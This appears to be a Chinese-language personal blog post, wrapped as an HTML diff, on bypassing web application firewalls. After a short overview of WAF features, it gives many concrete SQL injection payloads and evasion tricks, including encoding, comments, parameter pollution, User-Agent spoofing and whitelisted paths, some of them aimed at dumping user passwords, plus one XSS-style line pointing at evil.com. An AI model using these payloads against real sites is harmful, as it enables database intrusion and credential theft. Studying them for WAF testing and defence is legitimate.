@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="future.zhangyan">
+
+
+
+    <meta name="description" content="未来可期">
+
+
+
+<title>waf绕过 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+	<!--动态线条背景-->
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body>
+    <div class="wrapper">
+        <header>
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet">
+	  <script type="text/javascript" src="C:/Users/zhangyan/Desktop/blog/themes/next/source/js"></script>
+
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">张艳&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+				<label for="switch_default" class="toggleBtn"></label>
+         
+				<div class="search bar7">
+					<form id="search-form"> <!-- 搜索框相关 -->
+						<input type="text" id="local-search-input" name="q" results="0" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off"/>
+						<button type="submit" class="search-form-submit"></button>
+						<i class="fa fa-times" onclick="resetSearch()"></i> <!-- 清空/重置搜索框 -->
+					</form>
+					<div class="ins-section-wrapper">
+						<div class="ins-section-container"></div>
+					</div>
+					<div id="local-search-result"></div> <!-- 搜索结果区 -->
+						<p class='no-result'>No results found </p> <!-- 无匹配时显示，注意请在 CSS 中设置默认隐藏 -->
+					</div>
+
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">张艳&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+            </div>
+
+
+        </div>
+    </nav>
+
+</header>
+<style type="text/css">
+	* {
+		box-sizing:border-box;
+	}
+	body {
+		margin:0;
+		padding:0;
+		background-image:url(ydrzimages/p3.jpg);
+		font-weight:500;
+		font-family:"Microsoft YaHei","宋体","Segoe UI","Lucida Grande",Helvetica,Arial,sans-serif,FreeSans,Arimo;
+	}
+	#container {
+		width:500px;
+		height:820px;
+		margin:0 auto;
+	}
+	div.search {
+		padding:10px 0;
+		margin-left:200px
+	}
+	form {
+		position:relative;
+		width:300px;
+		margin:0 auto;
+	}
+	input,button {
+		border:none;
+		outline:none;
+	}
+	input {
+		width:100%;
+		height:42px;
+		padding-left:13px;
+	}
+	button {
+		height:42px;
+		width:42px;
+		cursor:pointer;
+		position:absolute;
+	}
+	/*搜索框7*/
+		  
+	.bar7 form {
+		height:42px;
+	}
+	.bar7 input {
+		width:200px;
+		border-radius:42px;
+		border:2px solid #324B4E;
+		transition:.3s linear;
+		float:right;
+	}
+	.bar7 input:focus {
+		width:300px;
+	}
+	.bar7 button {
+		background:none;
+		top:-2px;
+		right:20px;
+	}
+	.bar7 button:before {
+		content:"点..";
+		font-family:FontAwesome;
+		color:#324b4e;
+	}
+	.no-result{
+		display:none
+	}
+</style>
+
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">waf绕过</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">future.zhangyan</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 9, 2020&nbsp;&nbsp;21:34:12</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                            
+                        </span>
+						<span id="/2020/05/09/waf%E7%BB%95%E8%BF%87/" class="leancloud-visitors view" data-flag-title="waf绕过">
+						  <em class="post-meta-item-text">Pageviews:</em>
+						  <i class="leancloud-visitors-count"></i>
+						</span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/waf%E7%BB%95%E8%BF%87.png"></p>
+<p>安装介绍<a target="_blank" rel="noopener" href="https://www.jstxk.com/article/12.html">https://www.jstxk.com/article/12.html</a></p>
+<p>经过一番搜索，终于找到了解决方法，作下记录：这里先把Apache关掉，然后打开命令行工具，切换到apache安装目录下的bin文件夹，执行以下命令</p>
+<blockquote>
+<p>httpd.exe -k install -n apache2.0</p>
+<p>如果要删除服务重新来，可以输下面这个，给你留着备用</p>
+<p>sc delete apache2.0</p>
+<p>然后就会出现安装成功的提示，再进行安全狗的配置</p>
+</blockquote>
+<h2 id="🎃WAF简介"><a href="#🎃WAF简介" class="headerlink" title="🎃WAF简介"></a>🎃WAF简介</h2><blockquote>
+<p>1、网站WAF是一款集网站内容安全防护、网站资源保护及网站流量保护功能为一体的服务器工具。功能涵盖了网马/木马扫描、防SQL注入、防盗链、防CC攻击、网站流量实时监控、网站CPU监控、下载线程保护、IP黑白名单管理、网页防篡改功能等模块。能够为用户提供实时的网站安全防护，避免各类针对网站的攻击所带来的危害。 </p>
+<p> 2、网站WAF是一款服务器安全防护软件，是为IDC运营商、虚拟主机服务商、企业主机、服务器管理者等用户提供服务器安全防范的实用系统，是集网站内容安全防护、网站资源保护及网站流量保护功能为一体的服务器工具。</p>
+<p>3、常见的<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/2384478.htm">系统攻击</a>分为两类：一是利用Web服务器的<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/93544.htm">漏洞</a>进行攻击，如<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/5522.htm">DDOS攻击</a>、病毒<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/931.htm">木马</a>破坏等攻击；二是利用网页自身的<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/160026.htm">安全漏洞</a>进行攻击，如<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/983303.htm">SQL注入攻击</a>、<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/2633667.htm">跨站脚本攻击</a>等。常见攻击方式对网站服务器带来的危害主要集中在病毒<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/931.htm">木马</a>破坏、网页非法篡改、各类<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/133739.htm">网络攻击</a>带来的威胁。</p>
+</blockquote>
+<h2 id="🎐WAF主要功能"><a href="#🎐WAF主要功能" class="headerlink" title="🎐WAF主要功能"></a>🎐WAF主要功能</h2><p><strong>网马木马主动防御及查杀</strong></p>
+<blockquote>
+<p>　　<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/379675.htm">网页木马</a>和<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/131253.htm">网页挂马</a>扫描工具采用特征码+启发式引擎的查杀算法，WEB木马检出率大于90%</p>
+</blockquote>
+<hr>
+<p><strong>流量监控</strong></p>
+<blockquote>
+<p>能够实时监测到每个网站的进出流量和总流量，以及每个应用程序池及网站的CPU占用情况</p>
+</blockquote>
+<hr>
+<p><strong>网站漏洞防御功能</strong></p>
+<blockquote>
+<p>可拦截GET、POST、<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://baike.baidu.com/subview/1311/6319629.htm">COOKIES</a>等方式的SQL注入，可对GET、POST、COOKIES分别定义特征码，以及可拦截XSS注入等行为。</p>
+</blockquote>
+<hr>
+<p><strong>危险组件防护功能</strong></p>
+<blockquote>
+<p>全面拦截恶意代码对组件的调用权限，拦截IIS执行恶意程序，保护网站安全</p>
+</blockquote>
+<p><strong>.Net**</strong>安全保护模块**　</p>
+<blockquote>
+<p>　快捷设置.Net安全模式，禁止<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/4294.htm">.Net</a>执行系统敏感函数，保障网站安全</p>
+</blockquote>
+<p><strong>双层防盗链链接模式</strong>　　 </p>
+<blockquote>
+<p>可以针对不同站点设置防盗链的过滤, 防止图片、桌面、软件、音乐、电影被人引用。如果发现请求者是盗用网站链接, 则自动重定向到错误处理页面</p>
+</blockquote>
+<p><strong>网站特定资源防下载</strong></p>
+<blockquote>
+<p>支持对doc、mdb、mdf、myd等特定资源的防下载保护，加入要保护的敏感资料的路径，即可防止敏感资料被下载</p>
+</blockquote>
+<p><strong>CC**</strong>攻击防护**</p>
+<blockquote>
+<p>​    自主研发的独特抗攻击算法，高效的主动防御系统可有效防御<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/662394.htm">CC攻击</a>、流量攻击。</p>
+</blockquote>
+<p><strong>网站流量保护</strong></p>
+<blockquote>
+<p>支持下载流量控制、下载线程控制。采用独创的线程控制和<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/190232.htm">流量控制</a>技术,大大提高服务器性能, 保护网站流量。</p>
+</blockquote>
+<p><strong>IP**</strong>黑白名单**</p>
+<blockquote>
+<p>全IP黑白名单功能允许用户设置个性化的IP信任列表，直接屏蔽或者允许指定IP访问网站。同时，增加iP临时黑名单功能，以及实现了针对某个功能的iP白名单功能。同时，爬虫白名单提供爬虫信任机制，在出现误拦截情况下，允许用户自定义爬虫信任。</p>
+</blockquote>
+<h2 id="🎃-waf注入绕过检测方法"><a href="#🎃-waf注入绕过检测方法" class="headerlink" title="🎃   waf注入绕过检测方法"></a>🎃   waf注入绕过检测方法</h2><p><img src="/image/waf/1.jpg"></p>
+<p><strong>云waf直接找真实ip就可绕过</strong></p>
+<h3 id="1-双写绕过"><a href="#1-双写绕过" class="headerlink" title="1. 双写绕过"></a>1. 双写绕过</h3><p>• 举例：?id=1</p>
+<p>• 访问?id=1 and 1=1 页面报错 1=1，发现and被过滤，这时候尝试使用双写 的方式绕过，如aanndd 1=1，当and被过滤后，aanndd变成了and，所以 这时传输数据库的语句是and 1=1 ，如果当访问 order by 错误信息为‛der by‛这发现过滤了or，这双写or，后面注入和union注入的一致。</p>
+<h3 id="2-大小写绕过"><a href="#2-大小写绕过" class="headerlink" title="2. 大小写绕过"></a>2. 大小写绕过</h3><p>• 大小写绕过用于只针对小写或大写的关键字匹配技术，正则表达式 /express/i 大小写不敏感即无法绕过，这是最简单的绕过技术</p>
+<p>• 举例：z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</p>
+<p>• 示例场景可能的情况为filter的规则里有对大小写转换的处理，但不是每个 关键字或每种情况都有处理</p>
+<h3 id="3-替换关键字"><a href="#3-替换关键字" class="headerlink" title="3. 替换关键字"></a>3. 替换关键字</h3><p>• 这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、 union这些关键字，如果只匹配一次就很容易绕过</p>
+<p>• 举例：z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</p>
+<p>• 同样是很基础的技术，有些时候甚至构造得更复杂：SeLSeselectleCTecT， 不建议对此抱太大期望</p>
+<h3 id="4-编码绕过注入"><a href="#4-编码绕过注入" class="headerlink" title="4. 编码绕过注入"></a>4. 编码绕过注入</h3><p>URL编码</p>
+<p>访问id=1’,发现页面报出Mysql错误，接着访问id=1 and 1=1 和id=1 and 1=2 时，发现and被拦截，尝试使用URL全编码的方式绕过拦截。由于服务器会 自动对URL进行一次URL编码，所以需要把关键字编码两次，这里需要注意的地方是，URL编码需要选择全编码，而不是普通的URL编码。</p>
+<p>如： 关键字and进行两次URL全编码的结果是%25%36%31%25%36%65%25%36%34， 访问id=1 %25%36%31%25%36%65%25%36%34 1=1时，页面返回和id=1相同， 访问id=1 %25%36%31%25%36%65%25%36%34 1=2时，和id=1不同，所以该页面一定存在sql注入漏洞。</p>
+<p>后面的注入过程与union注入一致，只需判断过滤的关键词，并经过两次URL 全编码即可。</p>
+<h3 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h3><p>target.com/index.php?page_id=-15 /<em>!u%6eion</em>/ /<em>!se%6cect</em>/ 1,2,3,4…</p>
+<p>SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</p>
+<p>示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码</p>
+<h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><p>• Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了</p>
+<p>• 看一下常用的几个符号的一些Unicode编码：</p>
+<p>• 单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</p>
+<p>• 空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</p>
+<p>• 左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</p>
+<p>• 右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</p>
+<p>• 举例：?id=1%D6‘%20AND%201=2%23</p>
+<p>• SELECT ‘Ä’=‘A’; #1</p>
+<p>• 两个示例中，前者利用双字节绕过，比如对单引号转义操作变成’，那么就变成了%D6%5C’，%D6%5C构成了 一个宽字节即Unicode字节，单引号可以正常使用</p>
+<p>• 第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode 编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过</p>
+<p>• 另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过， 有兴趣的朋友可以去了解下</p>
+<p>• 常见的编码当然还有二进制、八进制，它们不一定都派得上用场，但后面会提到使用二进制的例</p>
+<h3 id="5-使用注释"><a href="#5-使用注释" class="headerlink" title="5. 使用注释"></a>5. 使用注释</h3><p>普通注释</p>
+<p>• 常见的用于注释的符号： //, – , /**/, #, – +, – - , ; ， – a</p>
+<p>• 举例：z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4</p>
+<p>• ‘union%a0select pass from users#</p>
+<p>• /**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别;#、-+用于终结语句的查询</p>
+<p>内联注释</p>
+<p>• 相比普通注释，内联注释用的更多，它有一个特性/!**/只有MySQL能识别</p>
+<p>• 举例：</p>
+<p>index.php?page_id=-15 /<em>!UNION</em>/ /<em>!SELECT</em>/ 1,2,3</p>
+<p>•   ?page_id=null%0A/<strong>//<em>!50000%55nIOn</em>//<em>yoyu</em>/all/</strong>/%0A/<em>!%53eLE ct</em>/%0A/<em>nnaa</em>/+1,2,3,4…</p>
+<p>• 两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点后面讨论的特殊符号也能实现，当然前提是包括/、*在内的这些字符能正常使用</p>
+<h3 id="6-等价函数与命令"><a href="#6-等价函数与命令" class="headerlink" title="6. 等价函数与命令"></a>6. 等价函数与命令</h3><p>某些函数或命令，因为WAF的过滤机制导致我们无法使用。那么，我们也可以尝试用一些等价函数来替代它们</p>
+<h4 id="1-函数或变量"><a href="#1-函数或变量" class="headerlink" title="1.函数或变量"></a>1.函数或变量</h4><p>• hex()、bin() ==&gt; ascii()</p>
+<p>• sleep() ==&gt;benchmark()</p>
+<p>• concat_ws()==&gt;group_concat()</p>
+<p>• mid()、substr() ==&gt; substring()</p>
+<p>• @@user ==&gt; user()</p>
+<p>• @@datadir ==&gt; datadir()</p>
+<h4 id="2-符号"><a href="#2-符号" class="headerlink" title="2.符号"></a>2.符号</h4><p>• and和or有可能不能使用，或者可以试下&amp;&amp;和||能不能用；还有=不能使用的情况，可以考虑尝试&lt;、&gt;，因为如果不小于又不大于，那便等于了</p>
+<p>• 如 id=1 or 1=1 可以换成 id=1 or 1!=2</p>
+<p>• 在看一下用得多的空格，可以使用如下符号表示其作用：%20 %09 %0a %0b %0c %0d %a0 /**/</p>
+<h4 id="3-生僻函数"><a href="#3-生僻函数" class="headerlink" title="3.生僻函数"></a>3.生僻函数</h4><p>  • MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘<script x=_></script> ’,’/script/@x/’,’src=//evil.com’);         </p>
+<p>  • ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))</p>
+<p>  • SELECT xmlelement(name img,xmlattributes(1as src,’a\l\x65rt(1)’as \117n\x65rror)); //postgresql</p>
+<p>  • ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p>
+<p>、</p>
+<p>• MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的 filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制。</p>
+<h3 id="7-特殊符号"><a href="#7-特殊符号" class="headerlink" title="7. 特殊符号"></a>7. 特殊符号</h3><p>• 这里把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法，涉及信息量比前面提到的几种都要多</p>
+<p>• 几个例子：</p>
+<p>• 1.使用反引号，例如select version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用</p>
+<p>• 2.神奇的”-+.”，select+id-1+1.from users; ‚+‛是用于字符串连接的，‛-‛和‛.‛ 在此也用于连接，可以逃过空格和关键字过滤</p>
+<p>• 3.@符号，select@^1.from users; @用于变量定义如@ var_name ，一个@表示用户定义，@@表示系统变量</p>
+<p>• 4.Mysql function() as xxx 也可不用as和空格 select-count(id)test from users; //绕过空格限制</p>
+<p>• 发挥大作用的字符(未包括’、*、/等在内，考虑到前面已经出现较多次了)： `、~、!、@、%、()、[]、.、-、+ 、|、%00</p>
+<h3 id="8-HTTP参数控制"><a href="#8-HTTP参数控制" class="headerlink" title="8. HTTP参数控制"></a>8. HTTP参数控制</h3><p>• 通过提供多个参数=相同名称的值集来混淆WAF。例如 <a target="_blank" rel="noopener" href="http://example.com/?id=1&amp;?id=%E2%80%99">http://example.com?id=1&amp;?id=’</a> or ‘1’=’1′ – ‘在某些情况下（例如使用 Apache/PHP），应用程序将仅解析最后（第二个） id= 而WAF只解析第一 个。在应用程序看来这似乎是一个合法的请求，因此应用程序会接收并处理这些恶意输入。如今，大多数的WAF都不会受到HTTP参数污染（HPP） 的影响，但仍然值得一试。</p>
+<p>• 1.HPP(HTTP Parameter Polution)</p>
+<p>• 举例：</p>
+<p> /?id=1;select+1,2,3+from+users+where+id=1–</p>
+<p>1</p>
+<p> /?id=1;select+1&amp;id=2,3+from+users+where+id=1–</p>
+<p>1</p>
+<p>/?id=1/**/union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=/users</p>
+<p>• HPP又称做重复参数污染，最简单的就是?uid=1&amp;uid=2&amp;uid=3，对于这种 情况，不同的Web服务器处理方式如下</p>
+<p>2.HPF(HTTP Parameter Fragment)</p>
+<p>• 这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)</p>
+<p>• 举例：</p>
+<p> •  /?a=1+union/<em>&amp;b=</em>/select+1,pass/<em>&amp;c=</em>/from+users–</p>
+<p>1</p>
+<p>• select * from table where a=1 union/* and b=/select 1,pass/ limit */from users—</p>
+<p>• 看罢上面两个示例，发现和HPP最后一个示例很像，不同之处在于参数不 一样，这里是在不同的参数之间进行分割，到了数据库执行查询时再合并 语句。</p>
+<p>• 3.HPC(HTTP Parameter Contamination)</p>
+<p>• RFC2396定义了如下一些字符：</p>
+<p>• Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ’ () Reserved : ; / ? : @ &amp; = + $ , Unwise : { } | \ ^ [ ] `</p>
+<p>不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：</p>
+<p>以魔术字符%为例，Asp/Asp.net会受到影响</p>
+<h3 id="9-缓冲区溢出-Advanced"><a href="#9-缓冲区溢出-Advanced" class="headerlink" title="9. 缓冲区溢出(Advanced)"></a>9. 缓冲区溢出(Advanced)</h3><p>• 缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p>
+<p>• 举例：</p>
+<p>  • ?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,1 3,14,15,16,17,18,19,20,21,22,23,24,25,26</p>
+<p>• 示例0xA*1000指0xA后面‛A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出</p>
+<h3 id="10-整合绕过"><a href="#10-整合绕过" class="headerlink" title="10. 整合绕过"></a>10. 整合绕过</h3><p>• 整合的意思是结合使用前面谈到的各种绕过技术，单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说是总体与局部和的关系，另一方面则是多种技术的使用创造了更多的可能性， 除非每一种技术单独都无法使用，否则它们能产生比自身大得多的能量。</p>
+<p> • target.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 “A”)..])+/<em>!uNIOn</em>/+/<em>!SeLECt</em>/+1,2,3,4… </p>
+<p> • id=1/<em>!UnIoN</em>/+SeLeCT+1,2,concat(/<em>!table_name</em>/)+FrOM /<em>information_schema</em>/.tables /<em>!WHERE <em>/+/</em>!TaBlE_ScHeMa</em>/+like+database()– -</p>
+<p> • ?id=5+/<em>!UNION</em>/+/<em>!SELECT</em>/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/<em>!INFORMATIO N_SCHEM</em>/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e–</p>
+<h2 id="WAF身份认证阶段的绕过"><a href="#WAF身份认证阶段的绕过" class="headerlink" title="WAF身份认证阶段的绕过"></a>WAF身份认证阶段的绕过</h2><p>​    WAF是有一个白名单的，在白名单内的客户请求将不做检测</p>
+<h3 id="🧨绕过方法一：伪造搜索引擎（一般不存在）"><a href="#🧨绕过方法一：伪造搜索引擎（一般不存在）" class="headerlink" title="🧨绕过方法一：伪造搜索引擎（一般不存在）"></a><strong>🧨绕过方法一：伪造搜索引擎（一般不存在）</strong></h3><p>老版本的WAF是有这个<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://www.2cto.com/">漏洞</a>的，就是把User-Agent修改为搜索引擎，可以通过火狐修改也可以通过burp修改；我这里用到burp</p>
+<p><img src="/image/waf/2.jpg"></p>
+<p>将其值设为自己想要的UserAgent（如:Baiduspider）</p>
+<p>如果想批量替换User_Agent，</p>
+<p><img src="/image/waf/3.jpg"></p>
+<h3 id="🧨绕过方法二：伪造白名单特殊目录（一般需要开发人员加入白名单，否则不行，以前的默认）"><a href="#🧨绕过方法二：伪造白名单特殊目录（一般需要开发人员加入白名单，否则不行，以前的默认）" class="headerlink" title="🧨绕过方法二：伪造白名单特殊目录（一般需要开发人员加入白名单，否则不行，以前的默认）"></a>🧨绕过方法二：伪造白名单特殊目录（一般需要开发人员加入白名单，否则不行，以前的默认）</h3><blockquote>
+<p>  <strong>360webscan脚本存在这个问题，就是判断是否为admin dede install等目录，如果是则不做拦截</strong></p>
+<p>比如：<a target="_blank" rel="noopener" href="http://www.spisec.com/pen/news.php?id=1">www.spisec.com/pen/news.php?id=1</a> union select user,password from mysql.user</p>
+<p>可以改为:</p>
+<p><a target="_blank" rel="noopener" href="http://www.spisec.com/pen/news.php/admin?id=1">www.spisec.com/pen/news.php/admin?id=1</a> union select user,password from mysql.user</p>
+<p>或者</p>
+<p><a target="_blank" rel="noopener" href="http://www.spisec.com/pen/news.php">www.spisec.com/pen/admin/..\news.php</a></p>
+<p>id=1 union select user,password from mysql.user</p>
+</blockquote>
+<h3 id="🧨绕过方法三：直接攻击源站"><a href="#🧨绕过方法三：直接攻击源站" class="headerlink" title="🧨绕过方法三：直接攻击源站"></a>🧨绕过方法三：直接攻击源站</h3><blockquote>
+<p> 这个方法可以用于安全宝、加速乐等云WAF，云WAF的原理通过DNS解析到云WAF，访问网站的流量要经过指定的DNS服务器解析，然后进入WAF节点进行过滤，最后访问原始服务器，如果我们能通过一些手段（比如c段、社工）找到原始的服务器地址，便可以绕过，这个我也没有找到太好的例子，就不多做说明了。</p>
+</blockquote>
+<h2 id="🧵WAF数据包解析阶段的绕过"><a href="#🧵WAF数据包解析阶段的绕过" class="headerlink" title="🧵WAF数据包解析阶段的绕过"></a>🧵WAF数据包解析阶段的绕过</h2><h3 id="（1）编码绕过"><a href="#（1）编码绕过" class="headerlink" title="（1）编码绕过"></a>（1）编码绕过</h3><p>最常见的方法之一，可以进行urlencode</p>
+<p><img src="/image/waf/4.jpg"></p>
+<p>现在一般不行</p>
+<hr>
+<h3 id="（2）修改请求方式绕过"><a href="#（2）修改请求方式绕过" class="headerlink" title="（2）修改请求方式绕过"></a>（2）修改请求方式绕过</h3><p>很多asp、aspx网站都存在这个问题，一般只防get注入而cookie与post注入不进行过滤防御</p>
+<p><img src="/image/waf/5.jpg"></p>
+<p>前提是代码接受request请求</p>
+<h3 id="（3）复参数绕过"><a href="#（3）复参数绕过" class="headerlink" title="（3）复参数绕过"></a>（3）复参数绕过</h3><blockquote>
+<p>例如一个请求是这样的</p>
+<p>GET/pen/news.php?id=1 union select user,password from mysql.user</p>
+<p>可以修改为</p>
+<p>GETpen/news.php?id=1&amp;id=union&amp;id=select&amp;id=user,password&amp;id=from%20mysql.user</p>
+<p>很多WAF都可以这样绕，测试最新版WAF能绕过部分语句</p>
+</blockquote>
+<h3 id="（4）WAF触发规则的绕过"><a href="#（4）WAF触发规则的绕过" class="headerlink" title="（4）WAF触发规则的绕过"></a>（4）WAF触发规则的绕过</h3><p><strong>WAF在这里主要是针对一些特殊的关键词或者用法进行检测。绕过方法很多，也是最有效的。</strong></p>
+<p><strong>绕过策略一：特殊字符替换空格（最新waf会被拦截）</strong></p>
+<blockquote>
+<p>用一些特殊字符代替空格，比如在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的WAF，在sqlserver中可以用/**/代替空格，也可以使用如下方法：</p>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.0.142:8080/sql.php?id=1/*%257C%2523--%2523%257C*/union/*%257C%2523--%2523%257C*/select/*%257C%2523--%2523%257C*/1,user(),3,4,5">http://192.168.0.142:8080/sql.php?id=1/<em>|%23–%23|</em>/union/<em>|%23–%23|</em>/select/<em>|%23–%23|</em>/1,user(),3,4,5</a></p>
